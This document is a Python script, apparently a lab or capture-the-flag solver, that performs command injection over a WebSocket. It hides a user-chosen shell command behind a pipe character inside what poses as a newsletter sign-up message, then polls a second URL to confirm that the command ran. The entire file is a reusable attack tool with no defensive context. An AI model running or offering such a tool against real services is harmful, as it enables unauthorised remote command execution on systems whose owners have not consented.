import requests
import websocket
import json
import argparse

class WebSocketCommandInjection:
    def __init__(self, websocket_url, command, response_keyword, check_url, success_keyword):
        self.websocket_url = websocket_url if websocket_url.endswith('/') else websocket_url + '/'
        self.command = command
        self.response_keyword = response_keyword
        self.check_url = check_url
        self.success_keyword = success_keyword
        self.session = requests.Session()

    def send_command_via_websocket(self):
        try:
            # Establish WebSocket connection
            ws = websocket.create_connection(self.websocket_url)
            # Send the command
            message_to_send = f'Hello, I would like to subscribe to the newsletter. This is my email address: attacker@example.com | {self.command}.'
            ws.send(json.dumps({'message': message_to_send}))
            print(f'Sent command: {message_to_send}')
            while True:
                response = ws.recv()
                print(f'Received response: {response}')
                if self.response_keyword in response:
                    break
            ws.close()
        except Exception as e:
            print(f'Error sending command: {e}')

    def check_success(self):
        try:
            # Check the success of the command
            response = self.session.get(self.check_url)
            if self.success_keyword in response.text:
                print('Action was successful.')
            else:
                print('Action was not successful.')
        except Exception as e:
            print(f'Error checking success: {e}')

    def start(self):
        self.send_command_via_websocket()
        self.check_success()

def main():
    parser = argparse.ArgumentParser(description='WebSocket Command Injection Tool')
    parser.add_argument('--websocket-url', required=True, help='WebSocket URL to connect to')
    parser.add_argument('--command', required=True, help='Command to inject via WebSocket')
    parser.add_argument('--response-keyword', required=True, help='Keyword to look for in WebSocket response')
    parser.add_argument('--check-url', required=True, help='URL to check for command success')
    parser.add_argument('--success-keyword', required=True, help='Keyword to look for in the response from the check URL')

    args = parser.parse_args()

    # Create WebSocketCommandInjection instance and start the process
    solver = WebSocketCommandInjection(
        websocket_url=args.websocket_url,
        command=args.command,
        response_keyword=args.response_keyword,
        check_url=args.check_url,
        success_keyword=args.success_keyword
    )
    solver.start()

if __name__ == "__main__":
    main()